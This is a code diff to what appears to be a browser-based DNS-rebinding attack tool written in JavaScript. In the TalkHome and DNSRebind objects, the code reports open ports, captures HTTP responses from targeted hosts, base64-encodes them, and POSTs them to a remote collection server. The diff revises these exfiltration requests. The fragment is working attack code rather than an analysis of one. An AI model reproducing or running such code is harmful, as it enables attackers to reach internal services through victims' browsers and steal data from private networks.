@@ -265,16 +265,16 @@ var TalkHome = {
 	'send_ports_open': function(ip, ports)	{
 		Network.request("POST", "/ports/open/" + ip, JSON.stringify(ports), console.log);
 	},
-	'service_detection': function(xhr, rhost, lip, lport)	{
+	'service_detection': function(xhr, host, rhost)	{
 		data = "HTTP/1.1 " + xhr.status + " " + xhr.statusText + "\r\n";
 		data += xhr.getAllResponseHeaders();
 		data += "\r\n\r\n";
 		data += xhr.response;
-		send = btoa(data);
+		send = window.btoa(data);
 		Network.request(
 				"POST",
-				"/service/detection/" + rhost + "/" + lip + "/" + String(lport),
-				data,
+				"http://" + host + "/service/detection/" + rhost,
+				send,
 				console.log
 		);
 	},
@@ -579,7 +579,7 @@ var DNSRebind = {
 		}
 	},
 	'send_200': function()	{
-		Network.request("GET", "/200?echo=OK&browser=" + Browser(), null, this.sendEach.bind(this));
+		Network.request_sd("GET", "/200?echo=OK&browser=" + Browser(), null, this.sendEach.bind(this), "invalid", "invalid");
 	},
 
 	'sendEach': function(xhr)	{
@@ -650,7 +650,7 @@ var DNSRebind = {
 		console.log(encoded);
 
 		Network.request("POST",
-				"http://" + this.server + "/service/detection/" + document.domain + "/" + this.ip + "/" + this.port,
+				"http://" + this.server + "/service/detection/" + document.domain,
 				encoded, this.got_response_cb.bind(this)
 		);
 	},
@@ -659,7 +659,7 @@ var DNSRebind = {
 		if(this.done == false)	{
 			this.done = true;
 		//	Network.request_advanced("GET", "/", null, this.got_response.bind(this), null, 20);
-			Network.request_sd("GET", "/", null, this.got_response.bind(this));
+			Network.request_sd("GET", "/", null, this.got_response.bind(this), "invalid", "invalid");
 		}
 	},
 };
